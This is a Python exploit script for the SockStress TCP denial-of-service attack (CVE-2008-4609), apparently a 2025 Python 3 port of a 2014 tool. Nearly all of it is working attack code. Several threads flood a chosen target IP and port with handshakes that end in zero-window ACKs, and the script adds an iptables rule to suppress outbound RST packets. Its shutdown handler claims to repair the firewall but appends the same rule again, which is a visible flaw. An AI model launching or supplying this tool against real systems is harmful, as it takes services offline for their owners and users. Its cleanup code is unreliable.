#!/usr/bin/env python3

"""
 Exploit Title: SockStress DoS
 Date: July 4, 2014
 Exploit Author: Justin Hutchens 
 LinkedIn: www.linkedin.com/in/justinhutchens
 Twitter: @pan0pt1c0n
 Tested on: Kali Linux x64
 CVE: CVE-2008-4609

 Python 3 port: January 2025 by movatica
"""

from ipaddress import IPv4Address
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from time import sleep
from _thread import start_new_thread
import os
from random import randint
import signal
import sys

from scapy.error import Scapy_Exception
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send, sr1


print("\n*******************************************************")
print("**  Python Sock Stress DoS                           **")
print("**  by Pan0pt1c0n (Justin Hutchens)                 **")
print("**  BREAK ALL THE SERVERS!!!                         **")
print("*******************************************************\n\n")

if len(sys.argv) != 4:
    print("Usage - ./sock_stress.py [Target-IP] [Port Number] [Threads]")
    print("Example - ./sock_stress.py 10.0.0.5 21 20")
    print("Example will perform a 20x multi-threaded sock-stress DoS attack ")
    print("against the FTP (port 21) service on 10.0.0.5")
    print("\n***NOTE***" )
    print("Make sure you target a port that responds when a connection is made")
    sys.exit()

dstaddr = IPv4Address(sys.argv[1])
dstport = int(sys.argv[2])
threads = int(sys.argv[3])


def sockstress(dstaddr: IPv4Address, dstport: int) -> None:
    """ Send SYN-ACK sequence with zero window. """
    dstaddr = str(dstaddr)

    while True:
        try:
            srcport = randint(0,65535)
            response = sr1(
                    IP(dst=dstaddr) / TCP(sport=srcport,dport=dstport,flags='S'),
                    timeout=1,
                    verbose=0)
            send(
                    IP(dst=dstaddr) / TCP(sport=srcport,dport=dstport,flags='A',ack=response[TCP].seq+1,window=0) / '\x00\x00',
                    verbose=0
                    )
        except Scapy_Exception:
            pass


## Graceful shutdown allows IP Table Repair
def graceful_shutdown(signal, frame):
    print('\nYou pressed Ctrl+C!')
    print('Fixing IP Tables')
    os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + str(dstaddr) + ' -j DROP')
    sys.exit()

## Creates IPTables Rule to Prevent Outbound RST Packet to Allow Scapy TCP Connections
os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + str(dstaddr) + ' -j DROP')
signal.signal(signal.SIGINT, graceful_shutdown)

## Spin up multiple threads to launch the attack
print("The onslaught has begun...use Ctrl+C to stop the attack")
for _ in range(threads):
    start_new_thread(sockstress, (dstaddr,dstport))

## Make it go FOREVER (...or at least until Ctrl+C)
while True:
    sleep(1)
